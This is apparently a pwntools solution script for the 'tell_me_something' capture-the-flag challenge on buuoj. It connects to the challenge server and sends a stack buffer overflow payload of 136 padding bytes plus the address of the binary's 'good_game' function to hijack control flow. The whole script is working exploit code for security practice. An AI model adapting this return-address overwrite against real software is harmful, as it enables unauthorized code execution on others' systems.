from pwn import *


def jarvisoj_tell_me_something(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_tell_me_something'):
    print('jarvisoj_tell_me_something start')

    target = remote('node4.buuoj.cn',27924)

    target_elf = ELF(file_name)

    good_game_plt = p64(target_elf.symbols['good_game'])

    payload = b'a'*136

    # good_game
    payload += good_game_plt

    target.sendlineafter('Input your message:\n', payload)

    print(target.recv())

    print('jarvisoj_tell_me_something end')


if __name__ == '__main__':
    jarvisoj_tell_me_something()
